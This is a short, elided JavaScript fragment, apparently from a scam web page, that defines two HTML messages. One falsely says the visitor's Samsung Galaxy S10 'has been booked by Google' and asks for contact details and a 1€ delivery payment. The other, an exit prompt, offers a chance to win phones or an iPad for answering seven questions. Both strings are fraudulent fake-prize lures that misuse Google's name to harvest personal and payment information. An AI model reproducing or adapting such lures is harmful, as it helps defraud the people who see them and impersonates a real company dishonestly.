...
(function () {
    ...
    function onDOMContentLoaded() {
        ...
        var takeitessage = '<div>Your <span class="marked">Samsung Galaxy S10</span> has been booked by Google!</div><br>Terms of Service:<br>1. Complete the delivery and contact information on the next page.<br>2. Pay only 1â‚¬ for the delivery of your gift.<br>3. Your Samsung Galaxy S10 will be shipped via DHL within two business days.</div>';
        ...
        var logomessage = '<div class="text-center">Wait!</div><br>Before you return to the home page, answer 7 simple questions and get a chance to win <span class="marked"><span class="marked">Samsung Galaxy S10, iPhone X or iPad Air 2.</span></span></div>';
